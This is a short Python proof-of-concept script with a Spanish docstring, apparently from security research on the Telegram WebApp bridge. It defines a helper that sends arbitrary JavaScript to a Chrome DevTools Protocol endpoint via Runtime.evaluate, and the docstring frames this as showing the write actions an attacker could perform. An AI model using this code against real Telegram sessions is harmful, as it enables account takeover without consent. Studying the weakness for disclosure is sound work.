"""
tg_active_exploitation.py -- Operaciones de escritura via bridge
Demuestra las acciones que un atacante puede ejecutar a traves
del bridge Telegram.WebApp usando CDP.
NOTA: Este script es un PoC conceptual. No ejecutar contra
cuentas sin autorizacion.
"""
import websocket
import json

def execute_bridge_action(ws_url, js_code):
    """Ejecutar una accion del bridge via CDP."""
    ws = websocket.create_connection(ws_url)
    cmd = json.dumps({
        "id": 1,
        "method": "Runtime.evaluate",
        "params": {"expression": js_code, "returnByValue": True}
    })
    ws.send(cmd)
    result = json.loads(ws.recv())
    ws.close()
    return result
